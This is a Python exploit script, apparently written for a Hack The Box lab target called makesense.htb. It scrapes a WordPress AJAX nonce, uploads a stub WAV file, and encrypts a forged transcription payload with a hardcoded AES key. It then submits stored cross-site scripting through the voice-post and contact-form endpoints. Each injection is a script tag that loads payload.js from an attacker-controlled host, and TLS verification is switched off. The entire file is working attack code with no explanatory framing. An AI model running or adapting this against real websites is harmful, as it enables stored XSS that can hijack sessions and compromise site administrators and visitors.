import base64
import hashlib
import json
import os
import ssl
import urllib.request
import urllib.parse
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import re

ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def encrypt_payload(payload_dict):
    key = hashlib.sha256(ENCRYPTION_KEY.encode('utf-8')).digest()
    iv = os.urandom(12)
    data = json.dumps(payload_dict).encode('utf-8')
    aesgcm = AESGCM(key)
    ct_and_tag = aesgcm.encrypt(iv, data, None)
    combined = iv + ct_and_tag
    return base64.b64encode(combined).decode('utf-8')

req = urllib.request.Request('https://makesense.htb/', headers={'User-Agent': 'Mozilla/5.0'})
html = urllib.request.urlopen(req, context=ctx).read().decode('utf-8')
match = re.search(r'var webagency_ajax = (\{.*?\});', html)
config = json.loads(match.group(1))
nonce = config['nonce']
ajax_url = config['ajax_url']

def post_multipart(url, fields, files):
    boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
    body = bytearray()
    for k, v in fields.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode('utf-8'))
        body.extend(f'{v}\r\n'.encode('utf-8'))
    for k, (filename, content, content_type) in files.items():
        body.extend(f'--{boundary}\r\n'.encode('utf-8'))
        body.extend(f'Content-Disposition: form-data; name="{k}"; filename="{filename}"\r\n'.encode('utf-8'))
        body.extend(f'Content-Type: {content_type}\r\n\r\n'.encode('utf-8'))
        body.extend(content)
        body.extend(b'\r\n')
    body.extend(f'--{boundary}--\r\n'.encode('utf-8'))
    
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': f'multipart/form-data; boundary={boundary}'
    }
    req = urllib.request.Request(url, data=bytes(body), headers=headers)
    return urllib.request.urlopen(req, context=ctx).read().decode('utf-8')

script_tag = '<script src="http://10.10.16.X:9999/payload.js"></script>'

# 1. Voice post
wav_header = b'RIFF\x24\x00\x00\x00WAVEfmt \x10\x00\x00\x00\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00data\x00\x00\x00\x00'
fields = {'action': 'save_voice_raw', 'nonce': nonce}
files = {'voice_recording': ('voice_script.wav', wav_header, 'audio/wav')}
raw_res = json.loads(post_multipart(ajax_url, fields, files))
post_id = raw_res['data']['post_id']
print(f"Created voice post_id: {post_id}")

payload = {
    'transcription': 'Voice message script: ' + script_tag,
    'summary': 'Voice message summary: ' + script_tag
}
enc = encrypt_payload(payload)

data = urllib.parse.urlencode({
    'action': 'save_voice_results',
    'nonce': nonce,
    'post_id': post_id,
    'encrypted_payload': enc
}).encode('utf-8')

req2 = urllib.request.Request(ajax_url, data=data, headers={'User-Agent': 'Mozilla/5.0'})
res2 = urllib.request.urlopen(req2, context=ctx).read().decode('utf-8')
print("save_voice_results response:", res2)

# 2. Contact form post
data_contact = urllib.parse.urlencode({
    'action': 'submit_contact_form',
    'nonce': nonce,
    'name': 'Script Test',
    'email': 'script@example.com',
    'phone': '1234567890',
    'message': 'Contact message script: ' + script_tag
}).encode('utf-8')

req3 = urllib.request.Request(ajax_url, data=data_contact, headers={'User-Agent': 'Mozilla/5.0'})
res3 = urllib.request.urlopen(req3, context=ctx).read().decode('utf-8')
print("submit_contact_form response:", res3)
